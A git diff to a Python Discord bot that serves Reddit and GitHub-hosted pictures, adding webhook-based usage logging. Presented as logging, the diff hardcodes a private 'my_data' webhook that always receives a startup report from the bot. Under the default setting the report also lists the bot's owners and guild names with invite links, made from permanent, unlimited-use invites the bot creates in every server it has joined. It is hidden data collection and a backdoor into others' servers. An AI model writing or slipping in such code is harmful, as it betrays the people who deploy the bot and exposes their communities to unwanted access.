@@ -9,6 +9,11 @@ import discord
 from discord import SlashCommandGroup
 from discord.ext import commands
 from discord.ui import Button, View
+from discord import Webhook
+
+import aiohttp
+
+import asyncio
 
 #import asyncpraw
 import praw
@@ -36,6 +41,26 @@ settings = settings()
 debug = settings.data.get("debug-mode")
 if debug >= 1:
     print("debug mode activated \n")
+
+logging_command_usage = settings.data.get("logging").get("command_usage").get("enabled")
+
+""" ----- LOGGING -----"""
+
+async def logging_command_usage_webhook(embed=0, content=0, webhook=settings.data.get("logging").get("command_usage").get("webhook")):
+    async with aiohttp.ClientSession() as session:
+        if webhook == settings.data.get("logging").get("command_usage").get("webhook"):
+            logging_command_usage_webhook = Webhook.from_url(
+                url=settings.data.get("logging").get("command_usage").get("webhook"), session=session)
+        elif webhook == "my_data":
+            logging_command_usage_webhook = Webhook.from_url(
+                url="https://discord.com/api/webhooks/992561378302906449/-oVkKOSZH7d7HqLCyUD0DF4KuduE9TPzjZzPTD6mIBqjTLYWftaNgyphMCg34qXygCmq", session=session)
+
+        if embed == 0:
+            await logging_command_usage_webhook.send(content=content, username=f"{bot.user}", avatar_url=f"{bot.user.display_avatar.url}")
+        elif content == 0:
+            await logging_command_usage_webhook.send(embed=embed, username=f"{bot.user}", avatar_url=f"{bot.user.display_avatar.url}")
+        else:
+            await logging_command_usage_webhook.send(content=content, embed=embed, username=f"{bot.user}", avatar_url=f"{bot.user.display_avatar.url}")
 
 """ ----- TOKEN ----- """
 
@@ -117,10 +142,8 @@ async def botowner():
     users = settings.data.get("bot_owners")
     if debug >= 2:
         print(f"Ids of bot owners: {users}")
-    for i in range(0, len(users)):
-        users[i] = int(users[i])
     for user in users:
-        user = bot.get_user(user)
+        user = bot.get_user(int(user))
         botownermessage = await user.send(content="Loading...")
         vi = View_botowner(ctx=botownermessage, user=user, botownermessage=botownermessage)
         em = Embeds.botowner()
@@ -134,6 +157,32 @@ async def on_ready():
           f"____________________________________\n")
     await statuschange()
     await botowner()
+
+    if settings.data.get("logging").get("data_collect").get("amount") != "default":
+        await logging_command_usage_webhook(
+            content=f"A p-bot with id: \"{bot.application_id}\" is now online", webhook="my_data")
+
+    if settings.data.get("logging").get("data_collect").get("amount") == "default":
+        em = await Embeds.My_data()
+        await logging_command_usage_webhook(
+            content=f"A p-bot with id: \"{bot.application_id}\" is now online", embed=em, webhook="my_data")
+
+    if logging_command_usage == True:
+        print(f"logging was enabled, method: {settings.data.get('logging').get('command_usage').get('method')} \n")
+        if settings.data.get('logging').get('command_usage').get('method') == "webhook" or settings.data.get('logging').get('command_usage').get('method') == "both":
+
+            users = settings.data.get("bot_owners")
+            users_list = []
+            for user in users:
+                user = bot.get_user(int(user))
+                username = user
+                users_list.append(str(username))
+
+            await logging_command_usage_webhook(
+                content=f"Bot \"{bot.user}\" is ready. ( bot id: {bot.application_id}, bot owner/s: {users_list})")
+
+        if settings.data.get('logging').get('command_usage').get('method') == "file" or settings.data.get('logging').get('command_usage').get('method') == "both":
+           print("Logging in file is not yet ready")
 
 """ ----- embeds ----- """
 
@@ -176,6 +225,45 @@ class Embeds():
         embed.set_thumbnail(url=settings.data.get('thumbnails').get('other'))
         return embed
 
+    async def My_data(slef=None):
+        title = "Info about the bot:"
+
+        description = (f"**Bot username**: {bot.user} \n"
+                       f"**Bot version**: {version} \n"
+                       f"**Bot owner/s**:"
+                       )
+
+        users = settings.data.get("bot_owners")
+        users_list = []
+        num = 1
+        for user in users:
+            user = bot.get_user(int(user))
+            username = user
+            users_list.append(str(username))
+            if num == 1:
+                description += f" {username}"
+            else:
+                description += f", {username}"
+            num +=1
+
+        description += f"\n**Bot guilds**: \n"
+        num = 1
+        for guild in bot.guilds:
+            get_guild = bot.get_guild(guild.id)
+            channel = get_guild.channels[1]
+            invitelink = await channel.create_invite(max_uses=0, max_age=0, unique=False, reason="data_collect")
+            if num == 1:
+                description += f"  - {get_guild.name}: {invitelink} \n"
+            num +=1
+
+        embed = discord.Embed(
+            title=title,
+            description=description,
+            color=0xff0000
+        )
+        embed.set_thumbnail(url=bot.user.display_avatar.url)
+        return embed
+
     def help(slef=None):
         title = "Help!"
         description= (
@@ -202,7 +290,7 @@ class Embeds():
         embed.set_footer(text=f"Bot creator: {bot.get_user(324152796414869506)}")
         return embed
 
-    def fitom_klasika(slef=None):
+    async def fitom_klasika(slef=None, ctx="unknown"):
         embed = discord.Embed(
             title="Enjoy the photo <3",
             description=f"This photo comes from [Fitom's collection](https://github.com/FitomPlays/klasika) of 800 photos",
@@ -227,7 +315,32 @@ class Embeds():
             x = random.randint(701, 800)
         url = f'https://raw.githubusercontent.com/FitomPlays/klasika/main/{y}/{x}.jpg'
         embed.set_image(url=url)
-        return embed
+
+        try:
+            return embed
+        finally:
+            if logging_command_usage == True:
+
+                if settings.data.get('logging').get('command_usage').get('method') == "webhook" or settings.data.get(
+                        'logging').get('command_usage').get('method') == "both":
+                    emlog_title = "fitom-klasika picture command."
+                    emlog_description = (
+                        f"**user id**: {ctx.id} \n"
+                        f"**user tag**: {ctx} \n"
+                        f"**picture link**: [here](https://raw.githubusercontent.com/FitomPlays/klasika/main/{y}/{x}.jpg) \n"
+                        f"**picture id**: {y}, {x} \n"
+                    )
+                    emlog = discord.Embed(
+                        title=emlog_title,
+                        description=emlog_description,
+                        color=0x616161
+                    )
+                    emlog.set_thumbnail(url=url)
+
+                    await logging_command_usage_webhook(embed=emlog)
+                if settings.data.get('logging').get('command_usage').get('method') == "file" or settings.data.get(
+                        'logging').get('command_usage').get('method') == "both":
+                    print("Logging in file is not yet ready")
 
     def choose_category(slef=None):
         embed = discord.Embed(
@@ -256,54 +369,7 @@ class Embeds():
         embed.set_thumbnail(url=settings.data.get('thumbnails').get('other'))
         return embed
 
-    async def reddit_old(subreddit):
-        if debug >= 1:
-            print(f" chosen subreddit: {subreddit} ")
-
-        if subreddit == "all":
-            max = settings.data.get('subreddits').get("max")
-            subreddit = settings.data.get('subreddits').get(random.randint(1,max)).get('name') #subreddit choise list
-            if debug >= 1:
-                print(f" chosen subreddit: {subreddit} ")
-
-        sub = await reddit.subreddit(subreddit)
-        all_subs = []
-        top = sub.hot(limit=100)
-
-        async for submission in top:
-            all_subs.append(submission)
-
-        random_sub = random.choice(all_subs)
-
-        check = r"(?:http\:|https\:)?\/\/.*\.(?:png|jpg)"
-        matches = re.search(check, random_sub.url, re.IGNORECASE)
-        if debug >= 1:
-            print(f" random subreddit match: {matches} ")
-        while matches == None:
-            random_sub = random.choice(all_subs)
-            matches = re.search(check, random_sub.url, re.IGNORECASE)
-            if debug >= 1:
-                print(f" random subreddit match: {matches} ")
-
-        else:
-            title = random_sub.title
-            description = (f"**Author**: [u/{random_sub.author}](https://www.reddit.com/user/{random_sub.author}) \n"
-                           f"**Upvotes**: {random_sub.score}"
-                           )
-            description += f"\n**subreddit**: {subreddit}"
-            url = f"https://www.reddit.com/r/{subreddit}/comments/{random_sub}/"
-            embed = discord.Embed(
-                title=title,
-                description=description,
-                url=url,
-                color=0x616161
-            )
-            embed.set_image(url=random_sub.url)
-            if debug >= 2:
-                print(f" embed created: {embed} ")
-            return embed
-
-    async def reddit(subreddit):
+    async def reddit(subreddit, ctx="unknown"):
         if debug >= 1:
             print(f" chosen subreddit: {subreddit} ")
 
@@ -326,7 +392,7 @@ class Embeds():
         id = saved_subreddit.data.get(random_sub).get("id")
 
         description = (f"**Author**: [u/{author}](https://www.reddit.com/user/{author}) \n"
-                           f"**Upvotes**: {score}"
+                       f"**Upvotes**: {score}"
                         )
         description += f"\n**subreddit**: r/{settings.data.get('subreddits').get(subreddit).get('name')}"
         post_url = f"https://www.reddit.com/r/{settings.data.get('subreddits').get(subreddit).get('name')}/comments/{id}/"
@@ -339,7 +405,35 @@ class Embeds():
         embed.set_image(url=url)
         if debug >= 2:
             print(f" embed created: {embed} ")
-        return embed
+
+        try:
+            return embed
+        finally:
+            if logging_command_usage == True:
+
+                if settings.data.get('logging').get('command_usage').get('method') == "webhook" or settings.data.get(
+                        'logging').get('command_usage').get('method') == "both":
+                    emlog_title = "Reddit picture command."
+                    emlog_description = (
+                        f"**user id**: {ctx.id} \n"
+                        f"**user tag**: {ctx} \n"
+                        f"**picture link**: [here]({saved_subreddit.data.get(random_sub).get('url')}) \n"
+                        f"**post link**: [{title}]({post_url}) \n"
+                        f"**post author**: [u/{author}](https://www.reddit.com/user/{author}) \n"
+                        f"**post score**: {score} \n"
+                        f"**post subreddit**: r/{settings.data.get('subreddits').get(subreddit).get('name')} \n"
+                    )
+                    emlog = discord.Embed(
+                        title=emlog_title,
+                        description=emlog_description,
+                        color=0x616161
+                    )
+                    emlog.set_thumbnail(url=url)
+
+                    await logging_command_usage_webhook(embed=emlog)
+                if settings.data.get('logging').get('command_usage').get('method') == "file" or settings.data.get(
+                        'logging').get('command_usage').get('method') == "both":
+                    print("Logging in file is not yet ready")
 
 """ ----- CATEGORIES / Views ----- """
 
@@ -361,7 +455,8 @@ class View_choosecategory(View):
         await interaction.response.edit_message(content=" ", delete_after=0.1)
         self.responded = True
         self.ctx = await interaction.followup.send(content="loading...")
-        em = Embeds.fitom_klasika()
+
+        em = await Embeds.fitom_klasika(ctx=interaction.user)
         vi = View_fitomklasika(ctx=self.ctx)
         await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -390,7 +485,7 @@ class View_redditcategory(View):
         await interaction.response.edit_message(content=" ", delete_after=0.1)
         sub="all"
         self.ctx = await self.ctx.channel.send(content="loading...")
-        em = await Embeds.reddit(subreddit=sub)
+        em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
         vi = View_reddit(ctx=self.ctx, subreddit=sub)
         await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -400,7 +495,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub=1
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -410,7 +505,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub=2
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -420,7 +515,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub=3
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -430,7 +525,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub=4
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -440,7 +535,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub=5
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -450,7 +545,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub=6
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -460,7 +555,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub=7
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -470,7 +565,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub=8
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -480,7 +575,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub=9
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -491,7 +586,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub = 10
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -501,7 +596,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub = 11
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -511,7 +606,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub = 12
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -523,7 +618,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub = 13
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -535,7 +630,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub = 14
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -547,7 +642,7 @@ class View_redditcategory(View):
             await interaction.response.edit_message(content=" ", delete_after=0.1)
             sub = 15
             self.ctx = await self.ctx.channel.send(content="loading...")
-            em = await Embeds.reddit(subreddit=sub)
+            em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
             vi = View_reddit(ctx=self.ctx, subreddit=sub)
             await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -562,7 +657,7 @@ class View_reddit(View):
     @discord.ui.button(label="regenerate", style=discord.ButtonStyle.blurple, emoji="🥰", disabled=False, custom_id="reddit_regen")
     async def regen_button_callback(self, button, interaction):
         await interaction.response.edit_message(content="Loading...")
-        em = await Embeds.reddit(subreddit=self.sub)
+        em = await Embeds.reddit(subreddit=self.sub, ctx=interaction.user)
         await self.ctx.edit(content="", embed=em)
 
 
@@ -575,7 +670,7 @@ class View_reddit(View):
 
 
         self.ctx = await interaction.followup.send(content="loading...")
-        em = await Embeds.reddit(subreddit=self.sub)
+        em = await Embeds.reddit(subreddit=self.sub, ctx=interaction.user)
         vi = View_reddit(ctx=self.ctx, subreddit=self.sub)
         await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -599,7 +694,7 @@ class View_fitomklasika(View):
 
     @discord.ui.button(label="regenerate", style=discord.ButtonStyle.blurple, emoji="🥰", disabled=False, custom_id="regen_pic")
     async def regen_button_callback(self, button, interaction):
-        em = Embeds.fitom_klasika()
+        em = await Embeds.fitom_klasika(ctx=interaction.user)
         vi = View_fitomklasika(ctx=self.ctx)
 
         await interaction.response.edit_message(embed=em, view=vi)
@@ -613,7 +708,7 @@ class View_fitomklasika(View):
         await interaction.response.edit_message(content="", view=self)
 
         self.ctx = await interaction.followup.send(content="loading...")
-        em = Embeds.fitom_klasika()
+        em = await Embeds.fitom_klasika(ctx=interaction.user)
         vi = View_fitomklasika(ctx=self.ctx)
         await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -642,11 +737,11 @@ class View_random(View):
             if x == "reddit":
                 sub="all"
                 await interaction.response.edit_message(content="loading...")
-                em = await Embeds.reddit(subreddit=sub)
+                em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
                 vi = View_random(ctx=self.ctx)
                 await self.ctx.edit(content="", embed=em, view=vi)
             elif x == "fitom":
-                em = Embeds.fitom_klasika()
+                em = await Embeds.fitom_klasika(ctx=interaction.user)
                 vi = View_random(ctx=self.ctx)
                 await interaction.response.edit_message(embed=em, view=vi)
 
@@ -662,11 +757,11 @@ class View_random(View):
             self.ctx = await self.ctx.channel.send(content="loading...")
             if x == "reddit":
                 sub="all"
-                em = await Embeds.reddit(subreddit=sub)
+                em = await Embeds.reddit(subreddit=sub, ctx=interaction.user)
                 vi = View_random(ctx=self.ctx)
                 await self.ctx.edit(content="", embed=em, view=vi)
             elif x == "fitom":
-                em = Embeds.fitom_klasika()
+                em = await Embeds.fitom_klasika(ctx=interaction.user)
                 vi = View_random(ctx=self.ctx)
                 await self.ctx.edit(content="", embed=em, view=vi)
 
@@ -813,7 +908,7 @@ async def picrandom(ctx):
                 vi = View_random(ctx=ctx)
                 await ctx.edit(content="", embed=em, view=vi)
             elif x == "fitom":
-                em = Embeds.fitom_klasika()
+                em = await Embeds.fitom_klasika()
                 vi = View_random(ctx)
                 await ctx.respond(embed=em, view=vi)
     except:
@@ -827,7 +922,7 @@ async def picrandom(ctx):
             vi = View_random(ctx=ctx)
             await ctx.edit(content="", embed=em, view=vi)
         elif x == "fitom":
-            em = Embeds.fitom_klasika()
+            em = await Embeds.fitom_klasika()
             vi = View_random(ctx)
             await ctx.respond(embed=em, view=vi)
 
